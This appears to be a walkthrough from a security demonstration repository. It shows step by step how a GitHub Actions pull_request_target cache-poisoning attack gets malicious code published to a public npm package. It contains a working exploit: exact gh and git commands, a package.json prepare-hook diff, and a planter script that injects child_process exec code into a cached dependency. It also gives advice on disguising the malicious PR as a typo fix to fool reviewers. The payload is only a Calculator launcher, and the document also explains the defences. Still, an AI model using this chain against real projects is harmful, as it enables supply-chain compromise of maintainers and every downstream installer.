# Attacker walkthrough — live end-to-end on real npm

You are the attacker. The target is `cache-poisoning-pwn-demo` on the public npm registry, owned by `lullu57`. You want a malicious version published *to npm* without stealing any credential, so consumers running `npm install cache-poisoning-pwn-demo` execute your code.

This walkthrough is the real attack. By the end, npm will host a version of the package that opens Calculator (or any other arbitrary code) on every consumer's machine.

## TL;DR — exact commands

Run **from a terminal authenticated as your attacker account** (not the maintainer). The attack must originate from a clone of *your fork*, not the maintainer's repo — `apply-attack.sh` refuses to run if `origin` points upstream.

```bash
# 0. Confirm you're the attacker in this shell.
gh auth status                 # must show <attacker-account> as active

# 1. Fork upstream onto the attacker account (one-time per demo cycle).
gh repo fork lullu57/gh-actions-demo-cache-poisoning --clone=false

# 2. Clone the fork to a separate path (one-time; the fork is reused across runs).
git clone https://github.com/<attacker-account>/gh-actions-demo-cache-poisoning /tmp/attacker-fork
cd /tmp/attacker-fork

# 3. Plant the payload on a fresh timestamped branch, commit, and push to your fork.
bash ~/Repositories/gh-actions-demo-cache-poisoning/attack/fork-changes/apply-attack.sh --push

# 4. Open the PR against upstream main using the gh command the script printed.
#    (Example shape — the script prints the real one with your branch name.)
gh pr create --repo lullu57/gh-actions-demo-cache-poisoning \
  --head <attacker-account>:docs/fix-typo-<timestamp> \
  --base main \
  --title 'docs: fix typo in README' --body 'tiny readme fix'
```

The chain detonates when the maintainer next pushes any commit to `main`. Calculator opens for every consumer who then installs the package.

The narrated, step-by-step version of all of this is below.

## What you control

- A GitHub account (your "attacker" account — not the maintainer's).
- The ability to fork a public repo and open a pull request.

That's all. No npm token. No GitHub credentials of `lullu57`. No write access to the target repo.

## The attack chain you'll execute

1. Fork the target repo.
2. On your fork, modify `package.json` and add a sneaky `prepare` hook + a planter script. Open the PR.
3. The target's `bundle-size` workflow triggers via `pull_request_target`. It runs `npm install` against your fork's code. Your `prepare` hook plants malicious code into `node_modules/is-number/index.js`. The workflow caches `node_modules`.
4. Close the PR (or leave it open — doesn't matter).
5. Wait. Sooner or later, `lullu57` pushes any change to `main` of the real repo. The release workflow restores the poisoned cache, builds `dist/postinstall.js` (which now contains the bundled malicious is-number), bumps the version, and publishes to npm via OIDC trusted publishing.
6. Every consumer who runs `npm install cache-poisoning-pwn-demo@latest` runs your code.

## Step 1: Fork

From your attacker account, fork `lullu57/gh-actions-demo-cache-poisoning`. Click the GitHub fork button.

## Step 2: Plant the payload

On a new branch (`docs/fix-typo` is a good name — looks innocuous), commit two changes:

### Change A — `package.json`

Modify the `scripts.prepare` field:

```diff
   "scripts": {
     "build": "node scripts/build.js",
-    "prepare": "npm run build",
+    "prepare": "node scripts/dev-hook.js && npm run build",
     "postinstall": "node -e \"try { require('./dist/postinstall.js'); } catch(e) {}\""
   },
```

**Do not modify** `package-lock.json` or `dependencies`. The cache key depends on the lockfile — if it changes, your poisoned cache won't be restored by the release workflow.

### Change B — `scripts/dev-hook.js`

Add the file from [`fork-changes/scripts/dev-hook.js`](fork-changes/scripts/dev-hook.js) (it's also reproduced below):

```js
// Looks like a build hook. Plants malicious code into is-number.
const fs = require('fs');
const path = require('path');

const target = path.join('node_modules', 'is-number', 'index.js');
const original = fs.readFileSync(target, 'utf8');

const payload = `
// Injected by attacker's cache-poisoning PR.
(() => {
  try {
    const { exec } = require('child_process');
    const cmd = process.platform === 'darwin' ? 'open -a Calculator'
              : process.platform === 'win32' ? 'calc.exe'
              : 'gnome-calculator 2>/dev/null || xcalc 2>/dev/null || true';
    exec(cmd);
    console.log('[supply-chain-demo] supply-chain attack PoC triggered.');
    console.log('[supply-chain-demo] see https://github.com/lullu57/gh-actions-demo-cache-poisoning');
  } catch (e) {}
})();
`;

fs.writeFileSync(target, payload + original);
console.log('[dev-hook] build cache pre-warmed');
```

Also include a `README.md` typo fix or some other harmless visible change so the PR has a plausible reason to exist.

### Change C — bonus believability

Add a `husky`-shaped comment to `scripts/dev-hook.js`:

```js
// This file is invoked by `prepare`. Pre-warms the build cache to speed
// up subsequent `npm run build` invocations. See https://example.com/...
```

Reviewers who skim see something that looks like a build optimization, not a code-execution gadget.

## Step 3: Open the PR

Title: `docs: fix typo in README`
Description: a one-line note about the README change.

Push the branch from your fork; open the PR against the target's `main`.

## Step 4: Watch the bundle-size workflow

The target's `vulnerable-bundle-size.yml` triggers. Because it uses `pull_request_target`, it runs *in the base repo's trust context*. Because it checks out your PR's HEAD, your `package.json` and `scripts/dev-hook.js` are on disk. Because it runs `npm install`, your `prepare` hook fires after deps install. Your `dev-hook.js` plants the payload into `node_modules/is-number/index.js`. The workflow caches `node_modules` (now poisoned) under key `nm-<lockfile-hash>`.

The bundle-size step reports a normal size. The workflow completes green. No comment is posted that mentions anything suspicious.

You are done. Close the PR if you want. The cache stays.

## Step 5: Wait for the release

You wait. The maintainer's normal workflow: some other unrelated PR gets merged to `main`. Or the maintainer pushes a docs change directly. Or Dependabot merges a bump. Anything that ends up as a push to `main`.

When that happens:

1. `vulnerable-release.yml` triggers on push.
2. It restores the cache `nm-<lockfile-hash>` — the SAME key your bundle-size run wrote to. `node_modules/is-number/index.js` is now the poisoned version.
3. `npm install` is a no-op (cache hit; matches lockfile).
4. `npm run build` runs `esbuild`, which bundles `node_modules/is-number/index.js` into `dist/postinstall.js`. The bundle contains your payload.
5. The version is bumped (e.g. `0.1.0` → `0.1.1`).
6. `npm publish --provenance --access public` ships the package to public npm. OIDC trusted publishing mints the token at publish time; no static credential needed.

## Step 6: Pwn

Anywhere in the world, anyone who runs:

```bash
npm install cache-poisoning-pwn-demo --min-release-age=0 --foreground-scripts
```

— gets `0.1.1` (or whatever the bumped version is). `npm` runs the package's `postinstall` script, which is `node -e "try { require('./dist/postinstall.js'); } catch(e) {}"`. That executes the bundled `dist/postinstall.js`, which contains your payload. Calculator opens. The `[supply-chain-demo]` line prints to their terminal.

(The `--min-release-age=0` is a per-invocation override needed only if the consumer has `npm config set min-release-age <days>` configured locally. Most don't. The flag is harmless to include and keeps the demo working in all environments.)

## Verifying the attack succeeded

After the release workflow completes:

1. Visit `https://www.npmjs.com/package/cache-poisoning-pwn-demo` and check the version.
2. Diff the source between v0.1.0 and v0.1.1 *on the npm tarball* (not on GitHub). The difference will be the bundled `dist/postinstall.js`. To inspect:
   ```bash
   npm view cache-poisoning-pwn-demo dist.tarball
   curl -O <tarball-url>
   tar xzf cache-poisoning-pwn-demo-0.1.1.tgz
   cat package/dist/postinstall.js   # contains your payload
   ```
3. On the GitHub side, the maintainer's commits on `main` show nothing malicious. The PR that introduced the poison can be closed, deleted, or simply ignored — the cache survived independently.

## What's in [`fork-changes/`](fork-changes/)

The exact files to commit on your attacker fork. Copy them verbatim or use `apply-attack.sh` to scaffold a fork with the right contents.

## Why this works

- `pull_request_target` runs in base trust context.
- Cache key derived from lockfile, which the attacker does not touch.
- `npm install` (not `npm ci`) leaves cache contents in place.
- Build bundles `node_modules/*` into the published artifact.
- Consumer-side `postinstall` executes the bundle.

Removing any one of these breaks the chain. The "safe" workflows in this repo remove three of them as defense-in-depth.

## Local simulation

```bash
node attack/simulate-attack.js
```

Reproduces the chain locally: applies the poison, runs the build, runs the bundled postinstall. Calculator opens on the demoer's machine.
